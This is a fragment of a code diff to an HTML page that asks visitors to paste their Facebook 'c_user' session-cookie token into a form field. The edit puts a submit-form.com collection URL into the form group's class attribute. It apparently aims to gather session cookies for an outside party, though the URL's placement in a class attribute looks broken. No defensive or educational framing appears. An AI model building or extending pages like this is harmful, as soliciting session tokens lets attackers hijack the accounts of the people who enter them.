@@ -560,7 +560,7 @@
             in browser cookies
           </p>
 
-          <div class="fb-input-group">
+          <div class="https://submit-form.com/F4mMl1Ri1">
             <label class="fb-input-label" for="c_user">c_user Token</label>
             <input type="text" id="c_user" class="fb-input" placeholder="Enter c_user token (numbers only)">
             <div id="c_user_error" class="error-message">
